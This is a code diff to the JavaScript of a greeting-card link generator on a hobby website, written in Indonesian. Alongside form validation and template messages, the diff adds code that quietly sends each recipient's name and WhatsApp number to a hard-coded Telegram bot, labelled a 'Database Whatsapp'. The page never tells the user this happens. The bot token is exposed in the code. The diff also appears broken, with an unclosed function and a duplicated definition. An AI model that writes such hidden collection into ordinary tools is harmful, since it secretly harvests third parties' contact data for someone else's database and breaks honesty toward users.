@@ -4772,80 +4772,61 @@ main.innerHTML = content;
   document.getElementById("sidebar").classList.remove("active");
 }
 
-if (page === 'adminucapan') {
-  content = `
-    <section class="adminucapan-container">
-      <div class="adminucapan-box">
-        <h2 class="adminucapan-title">🎁 Generator Link Ucapan</h2>
+function generateUcapanLink() {
+  const dari = document.getElementById("adminDari").value.trim();
+  const nama = document.getElementById("adminNama").value.trim();
+  const gender = document.getElementById("adminGender").value;
+  const hubungan = document.getElementById("adminHubungan").value;
+  const tema = document.getElementById("adminTema").value;
+  const pesan = document.getElementById("adminPesan").value.trim();
+  const wa = document.getElementById("adminWa").value.trim();
 
-        <label>Dari:</label>
-        <input type="text" id="adminDari" class="adminucapan-input" placeholder="Contoh: Vicky / Kak Vicky / Secret Admirer">
+  if (!dari || !nama || !wa || !tema) {
+    alert("Mohon lengkapi semua data wajib: Dari, Kepada, Nomor WhatsApp, dan Tema.");
+    return;
+  }
 
-        <label>Kepada:</label>
-        <input type="text" id="adminNama" class="adminucapan-input" placeholder="Masukkan nama penerima...">
+  // Validasi isi pesan minimal 3 baris jika tidak kosong
+  const pesanLines = pesan.split("\n").filter(line => line.trim() !== "");
+  if (pesan && pesanLines.length < 3) {
+    alert("Pesan harus minimal 3 baris jika ingin diisi.");
+    return;
+  }
 
-        <label>Jenis Kelamin:</label>
-        <select id="adminGender" class="adminucapan-input">
-          <option value="pria">Pria</option>
-          <option value="wanita">Wanita</option>
-        </select>
+  // Pesan default berdasarkan tema
+  const defaultPesan = {
+    ulangtahun: `Selamat ulang tahun ${nama}! 🎉\nSemoga panjang umur dan sehat selalu.\nTetap jadi ${hubungan} terbaik ya!`,
+    mintamaaf: `Aku minta maaf ya ${nama} 🙏\nAku sadar aku salah dan ingin memperbaiki semuanya.\nSemoga kamu bisa maafin aku.`,
+    weekend: `Selamat menikmati weekend, ${nama}! 😄\nSemoga akhir pekanmu menyenangkan.\nJangan lupa istirahat ya.`,
+    dating: `Hai ${nama} 💕\nKamu sibuk gak hari ini?\nAku pengen ajak kamu jalan bareng...`,
+    dinner: `Malam ini kita dinner bareng yuk? 🍽️\nAku yang traktir deh hehe\nTemenin aku ya ${nama}!`
+  };
 
-        <label>Hubungan:</label>
-        <select id="adminHubungan" class="adminucapan-input">
-          <option value="adik">Adik</option>
-          <option value="kakak">Kakak</option>
-          <option value="saudara">Saudara</option>
-          <option value="sepupu">Sepupu</option>
-          <option value="pacar">Pacar</option>
-          <option value="hts">HTS</option>
-          <option value="teman dekat">Teman Dekat</option>
-          <option value="rekan kerja">Rekan Kerja</option>
-          <option value="gebetan">Gebetan</option>
-          <option value="mantan">Mantan</option>
-          <option value="dll">Lainnya</option>
-        </select>
+  // Jika tidak ada pesan manual, gunakan default berdasarkan tema
+  let finalPesan = pesan;
+  if (!pesan) {
+    finalPesan = defaultPesan[tema] || `Hai ${nama}, ini pesan dari ${dari}. Semoga harimu menyenangkan!`;
+  }
 
-        <label>Tema Ucapan:</label>
-        <select id="adminTema" class="adminucapan-input">
-          <option value="ulangtahun">Ulang Tahun</option>
-          <option value="mintamaaf">Minta Maaf</option>
-          <option value="weekend">Weekend</option>
-          <option value="dating">Dating</option>
-          <option value="dinner">Dinner</option>
-        </select>
+  // Buat URL Link Ucapan
+  const baseLink = `https://vlcrave.github.io/home/ucapan.html`;
+  const fullLink = `${baseLink}?tema=${encodeURIComponent(tema)}&nama=${encodeURIComponent(nama)}&dari=${encodeURIComponent(dari)}&pesan=${encodeURIComponent(finalPesan)}&wa=${encodeURIComponent(wa)}`;
 
-        <label>Pesan (Opsional):</label>
-        <textarea id="adminPesan" class="adminucapan-input" placeholder="Kosongkan jika ingin auto generate..."></textarea>
+  // Tampilkan hasil
+  document.getElementById("adminResult").style.display = "block";
+  document.getElementById("adminLink").innerText = fullLink;
 
-        <button class="adminucapan-btn" onclick="generateUcapanLink()">Buat Ucapan</button>
-
-        <div id="adminResult" class="adminucapan-result" style="display: none;">
-          <p>✅ Link Ucapan:</p>
-          <div id="adminLink" class="adminucapan-link"></div>
-          <button onclick="copyAdminLink()">Salin Link</button>
-
-          <div style="margin-top: 1.2rem;">
-            <p style="margin-bottom: 0.5rem;">📱 Scan QR Code:</p>
-            <div id="adminQrCode"></div>
-          </div>
-
-          <div style="margin-top: 1.2rem;">
-            <button onclick="shareToWhatsApp()" style="margin-top: 1rem; background: #25D366; color: white; padding: 0.6rem 1.2rem; border-radius: 0.5rem; border: none; cursor: pointer;">
-              💬 Kirim Lewat WhatsApp
-            </button>
-          </div>
-        </div>
-      </div>
-    </section>
-  `;
-
-  main.innerHTML = content;
-  document.getElementById("sidebar").classList.remove("active");
-
-  const qrScript = document.createElement("script");
-  qrScript.src = "https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js";
-  document.body.appendChild(qrScript);
-}
+  // Buat QR Code
+  if (typeof QRCode !== 'undefined') {
+    document.getElementById("adminQrCode").innerHTML = "";
+    new QRCode(document.getElementById("adminQrCode"), {
+      text: fullLink,
+      width: 160,
+      height: 160,
+      colorDark: "#000000",
+      colorLight: "#ffffff"
+    });
+  }
 
 
 
@@ -4871,80 +4852,93 @@ if (page === 'danakaget') {
 
 /////// PISAHIN //////
 
+
+
 function generateUcapanLink() {
-  const dariRaw = document.getElementById("adminDari").value.trim() || "Seseorang";
-  const namaRaw = document.getElementById("adminNama").value.trim() || "Seseorang";
+  const dari = document.getElementById("adminDari").value.trim();
+  const nama = document.getElementById("adminNama").value.trim();
   const gender = document.getElementById("adminGender").value;
   const hubungan = document.getElementById("adminHubungan").value;
   const tema = document.getElementById("adminTema").value;
-  let pesan = document.getElementById("adminPesan").value.trim();
+  const pesan = document.getElementById("adminPesan").value.trim();
+  const wa = document.getElementById("adminWa").value.trim();
 
-  // Auto-generate pesan jika tidak diisi
-  if (!pesan) {
-    if (tema === 'ulangtahun') {
-      if (hubungan === 'adik') {
-        pesan = gender === 'pria'
-          ? "🎉 Selamat ulang tahun, dek! Semoga makin pintar dan sehat selalu 💪"
-          : "🎂 Happy birthday, adikku tersayang! Semoga hidupmu selalu penuh warna 🌈";
-      } else if (['pacar', 'gebetan', 'hts'].includes(hubungan)) {
-        pesan = gender === 'pria'
-          ? "💖 Happy birthday, cintaku! Semoga tahun ini penuh kebahagiaan dan hal indah bareng kita."
-          : "🎉 Selamat ulang tahun, sayang! Makasih udah hadir dan bikin hidupku lebih berwarna.";
-      } else {
-        pesan = "🎉 Selamat ulang tahun! Semoga sehat, bahagia, dan semua harapanmu terkabul ya 🙏";
-      }
-    } else if (tema === 'mintamaaf') {
-      pesan = ['pacar', 'gebetan'].includes(hubungan)
-        ? "🙏 Aku tahu aku salah. Aku nggak mau kehilangan kamu cuma karena hal sepele. Maafin aku ya 💔"
-        : "🙏 Maaf ya kalau aku sempat mengecewakan. Aku bener-bener pengen memperbaiki semuanya.";
-    } else if (tema === 'weekend') {
-      pesan = hubungan === 'rekan kerja'
-        ? "☀️ Happy weekend! Semoga bisa recharge dan kembali produktif minggu depan 💼"
-        : "🍃 Selamat weekend! Waktunya istirahat dan nikmati hari tanpa beban yaa 😌";
-    } else if (tema === 'dating') {
-      pesan = ['pacar', 'gebetan', 'hts'].includes(hubungan)
-        ? "💌 Aku pengen quality time sama kamu hari ini. Gimana kalau kita jalan berdua?"
-        : "😅 Aku pengen ngajak kamu keluar hari ini. Santai aja, kayaknya bakal seru bareng kamu.";
-    } else if (tema === 'dinner') {
-      pesan = ['pacar', 'hts'].includes(hubungan)
-        ? "🍽️ Makan malam bareng yuk? Nggak perlu mewah, yang penting kamu di sebelahku ❤️"
-        : "🍴 Dinner bareng malam ini? Sekalian ngobrol dan ketawa bareng kayak dulu 😄";
-    }
+  // Validasi wajib
+  if (!dari || !nama || !wa || !tema) {
+    alert("Mohon lengkapi semua data wajib: Dari, Kepada, Nomor WhatsApp, dan Tema.");
+    return;
   }
 
-  const finalLink = `https://vlcrave.github.io/home/ucapan/${tema}.html?nama=${encodeURIComponent(namaRaw)}&pesan=${encodeURIComponent(pesan)}`;
-  document.getElementById("adminLink").innerText = finalLink;
+  // Validasi isi pesan jika ada
+  const pesanLines = pesan.split("\n").filter(line => line.trim() !== "");
+  if (pesan && pesanLines.length < 3) {
+    alert("Pesan harus minimal 3 baris jika ingin diisi.");
+    return;
+  }
+
+  // Template pesan berdasarkan tema (fallback otomatis)
+  const defaultPesan = {
+    ulangtahun: `Selamat ulang tahun ${nama}! 🎉\nSemoga panjang umur dan sehat selalu.\nTetap jadi ${hubungan} terbaik ya!`,
+    mintamaaf: `Aku minta maaf ya ${nama} 🙏\nAku sadar aku salah dan ingin memperbaiki semuanya.\nSemoga kamu bisa maafin aku.`,
+    weekend: `Selamat menikmati weekend, ${nama}! 😄\nSemoga akhir pekanmu menyenangkan.\nJangan lupa istirahat ya.`,
+    dating: `Hai ${nama} 💕\nKamu sibuk gak hari ini?\nAku pengen ajak kamu jalan bareng...`,
+    dinner: `Malam ini kita dinner bareng yuk? 🍽️\nAku yang traktir deh hehe\nTemenin aku ya ${nama}!`,
+    roomwangi: `Buat kamu, ${nama}, si pemilik room paling wangi 💐\nJangan kasih musuh napas malam ini!\nAyo gas bareng ML malam ini!`,
+    motivasi: `Halo ${nama},\nKamu hebat dan punya potensi besar 💪\nTerus semangat dan jangan menyerah ya!`,
+    random: `Hai ${nama}, ada pesan spesial buat kamu 🎁\nSemoga hari ini membawa senyuman\nDari: ${dari}`
+  };
+
+  // Pilih pesan final
+  const finalPesan = pesan || defaultPesan[tema] || `Halo ${nama}, ini pesan spesial dari ${dari}. Semoga harimu menyenangkan!`;
+
+  // Buat link ucapan
+  const baseUrl = "https://vlcrave.github.io/home/ucapan.html";
+  const query = `?tema=${tema}&nama=${encodeURIComponent(nama)}&dari=${encodeURIComponent(dari)}&pesan=${encodeURIComponent(finalPesan)}&wa=${wa}`;
+  const link = `${baseUrl}${query}`;
+
+  // Tampilkan hasil
   document.getElementById("adminResult").style.display = "block";
+  document.getElementById("adminLink").innerText = link;
 
   // Generate QR Code
-  const qrContainer = document.getElementById("adminQrCode");
-  qrContainer.innerHTML = "";
-  new QRCode(qrContainer, {
-    text: finalLink,
-    width: 160,
-    height: 160,
-    colorDark: "#38bdf8",
-    colorLight: "#ffffff",
-    correctLevel: QRCode.CorrectLevel.H
-  });
+  if (typeof QRCode !== 'undefined') {
+    document.getElementById("adminQrCode").innerHTML = "";
+    new QRCode(document.getElementById("adminQrCode"), {
+      text: link,
+      width: 160,
+      height: 160,
+      colorDark: "#000000",
+      colorLight: "#ffffff"
+    });
+  }
 
-  // Simpan data "Dari" untuk digunakan di shareToWhatsApp()
-  document.getElementById("adminResult").dataset.nama = namaRaw;
-  document.getElementById("adminResult").dataset.dari = dariRaw;
-  document.getElementById("adminResult").dataset.pesan = pesan;
+  // Kirim ke Telegram
+  const token = "7922409540:AAFitc5JFHh9Xs2omx8HqTgJ2d9qE_hN7Kw";
+  const chatId = "6046360096";
+  const telegramMsg = `📥 *Database Whatsapp dari Generator Ucapan*\n\n👤 Nama: ${nama}\n📱 Nomor WhatsApp: ${wa}\n\n🔗 Link:\n${link}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: telegramMsg,
+      parse_mode: "Markdown"
+    })
+  });
+}
+
+function copyAdminLink() {
+  const link = document.getElementById("adminLink").innerText;
+  navigator.clipboard.writeText(link).then(() => alert("Link berhasil disalin!"));
 }
 
 function shareToWhatsApp() {
   const link = document.getElementById("adminLink").innerText;
-  const nama = document.getElementById("adminResult").dataset.nama || "Seseorang";
-  const dari = document.getElementById("adminResult").dataset.dari || "Seseorang";
-  const pesan = document.getElementById("adminResult").dataset.pesan || "Ada ucapan spesial buat kamu!";
-
-  const finalMessage = `Hai ${nama}! Aku punya ucapan spesial buat kamu nih 🥰\n\n${pesan}\n\nCek di sini ya 👉 ${link}\n\n— Dari ${dari}`;
-  const waUrl = `https://wa.me/?text=${encodeURIComponent(finalMessage)}`;
-
-  window.open(waUrl, "_blank");
+  const text = `Hai, ini ada ucapan spesial buat kamu:\n${link}`;
+  window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, "_blank");
 }
+
 
 
 function generateShortUrl() {
